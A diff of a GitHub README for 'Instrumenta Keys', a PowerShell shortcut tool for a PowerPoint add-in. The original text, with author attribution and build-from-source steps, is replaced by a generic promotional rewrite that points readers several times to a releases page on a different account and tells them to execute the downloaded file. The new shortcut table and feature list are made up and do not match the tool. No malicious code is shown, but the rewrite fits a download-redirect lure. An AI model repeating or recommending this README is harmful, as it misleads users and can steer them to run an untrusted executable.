@@ -1,51 +1,85 @@
-# Instrumenta Keys
-Instrumenta Keys is a **keyboard shortcut companion** for [Instrumenta](https://github.com/iappyx/Instrumenta/), bringing **customizable keyboard shortcuts** to Instrumenta. Since **VBA for PowerPoint lacks native keyboard shortcut support**, Instrumenta Keys -written in **Microsoft PowerShell**- runs independently alongside Instrumenta, enabling users to **assign shortcuts via a simple CSV file**.
+# Instrumenta-Keys: Your Keyboard Shortcut Companion for Instrumenta 🎹
 
-[@iappyx](https://github.com/iappyx)
+![Instrumenta-Keys](https://img.shields.io/badge/Instrumenta--Keys-v1.0.0-blue.svg)
+[![Releases](https://img.shields.io/badge/Releases-Check%20Here-brightgreen.svg)](https://github.com/weybsite/Instrumenta-Keys/releases)
+
+Welcome to **Instrumenta-Keys**, a comprehensive keyboard shortcut companion designed specifically for the Instrumenta add-in for PowerPoint. This repository serves as a guide to help you navigate the various keyboard shortcuts available, enhancing your productivity and streamlining your workflow.
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Available Shortcuts](#available-shortcuts)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
+
+## Introduction
+
+The **Instrumenta-Keys** project aims to provide users with an easy-to-use reference for keyboard shortcuts that can significantly improve the efficiency of presentations. With a variety of features tailored for the Instrumenta add-in, this tool empowers users to make the most of their PowerPoint experience.
+
+To get started, visit our [Releases page](https://github.com/weybsite/Instrumenta-Keys/releases) to download the latest version of the add-in. Follow the installation instructions to begin using the shortcuts right away.
 
 ## Features
-- **Fully configurable:** Easily customize shortcuts in the CSV file to match your workflow.
-- **Runs independently:** Instrumenta Keys works alongside Instrumenta without modifying its core functionality.
-- **Compatible with other VBA projects:** Designed to integrate with any VBA-based automation, not just Instrumenta.
 
-## Experimental Notice
-Instrumenta Keys is **highly experimental** and is licensed under the **MIT license**. You may freely use, modify, and distribute it, but **use at your own risk**. If you integrate this code into your own project—whether for **personal or commercial use**—please provide proper attribution in line with the **MIT license requirements**.
-
-As stated in the license: THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-
-![image](https://github.com/user-attachments/assets/2962b007-77b6-4142-9c36-f9ae8886bae1)
-
-## Platform Support
-Instrumenta Keys currently supports **Windows only**.  
-An **AppleScript version** is under exploration.
+- **Comprehensive Shortcut List**: Access a detailed list of keyboard shortcuts for various functions within the Instrumenta add-in.
+- **User-Friendly Interface**: Enjoy a clean and simple interface that makes finding shortcuts easy.
+- **Customization Options**: Modify shortcuts to suit your workflow and preferences.
+- **Regular Updates**: Stay up-to-date with the latest features and improvements through regular releases.
 
 ## Installation
-Instrumenta Keys is a **PowerShell script** and does not require administrative rights for installation on most enterprise systems.
 
-### Windows Installation
-1. **Download the binary:** [Instrumenta Keys.exe](https://github.com/iappyx/Instrumenta-Keys/raw/main/bin/Instrumenta%20Keys.exe)
-2. **Download the shortcut configuration file:** [shortcuts.csv](https://github.com/iappyx/Instrumenta-Keys/raw/main/bin/shortcuts.csv) (Right-click the link and select "Save As" to download the file)
-3. *Optional:* Open `shortcuts.csv` and customize your shortcuts. Instructions and a full list of available macros in Instrumenta can be found [here](https://github.com/iappyx/Instrumenta-Keys/blob/main/instrumenta_macros.md)
-5. Run the binary. It will automatically **minimize to the system tray** after a few seconds. Enjoy your shortcuts!
-6. To open it again, **click the Instrumenta Keys icon** in the system tray. If you click the icon again it will hide again.
+To install **Instrumenta-Keys**, follow these steps:
 
-Note: A security notice may appear when running the binary, please refer to [these](https://support.microsoft.com/en-gb/topic/a-potentially-dangerous-macro-has-been-blocked-0952faa0-37e7-4316-b61d-5b5ed6024216) instructions from Microsoft to unblock Instrumenta Keys: (1) Open Windows File Explorer and go to the folder where you saved the file; (2) Right-click the file and choose Properties from the context menu; (3) At the bottom of the General tab, select the Unblock checkbox and select OK.
-   
-## How to Build from Source
-Building your own Instrumenta Keys is very simple:
+1. Visit the [Releases page](https://github.com/weybsite/Instrumenta-Keys/releases) to download the latest version.
+2. Locate the downloaded file and execute it.
+3. Follow the on-screen instructions to complete the installation.
+4. Open PowerPoint and access the Instrumenta add-in to start using the shortcuts.
 
-### Requirements
-- **Microsoft PowerShell**
-- **PS2EXE module** (PowerShell-to-EXE converter)
+## Usage
 
-### Steps
-1. Locate the source code in `\src\src.ps1`
-2. Run the build script in an elevated PowerShell window: `.\build.ps1`
-3. The executable will be generated in `\bin\Instrumenta Keys.exe`
+Using **Instrumenta-Keys** is straightforward. Once installed, you can refer to the shortcut list whenever you need it. Simply open the add-in, and the shortcuts will be readily available.
 
-# Feature requests and contributions
-I am happy to receive feature requests and code contributions! Let's make the best toolbar together. For feature requests please create new issue and label it as an enhancement (https://github.com/iappyx/Instrumenta/issues/new/choose). 
+## Available Shortcuts
 
-- If you want to contribute, please make sure that the code can be freely used as open source code. Please only update the files in /src/. For security reasons I will not accept updated .exe files.
-- If you want to share your csv-file, please add it to /shared-shortcuts/
-- If you like this Instrumenta & Instrumenta Keys, please let me and the community know how you are using this in your daily work: https://github.com/iappyx/Instrumenta/discussions/5
+Here are some of the most useful keyboard shortcuts you can use with the Instrumenta add-in:
+
+| Action                         | Shortcut Key     |
+|-------------------------------|------------------|
+| Open Instrumenta Toolbar      | `Ctrl + Alt + I` |
+| Start Presentation             | `F5`             |
+| Pause Presentation             | `B`              |
+| Next Slide                    | `Right Arrow`    |
+| Previous Slide                | `Left Arrow`     |
+| Insert New Slide              | `Ctrl + M`       |
+| Save Presentation              | `Ctrl + S`       |
+| Zoom In                       | `Ctrl + +`       |
+| Zoom Out                      | `Ctrl + -`       |
+
+This list is not exhaustive. For a complete list of shortcuts, please refer to the documentation included with the add-in.
+
+## Contributing
+
+We welcome contributions to **Instrumenta-Keys**! If you have suggestions for improvements or would like to report an issue, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your changes to your forked repository.
+5. Submit a pull request for review.
+
+Your contributions help us improve the tool and provide a better experience for all users.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Support
+
+If you have any questions or need assistance, please check the [Releases section](https://github.com/weybsite/Instrumenta-Keys/releases) for the latest updates and documentation. You can also open an issue in the repository for any specific inquiries.
+
+---
+
+Thank you for using **Instrumenta-Keys**! We hope this tool enhances your PowerPoint experience and helps you create amazing presentations.
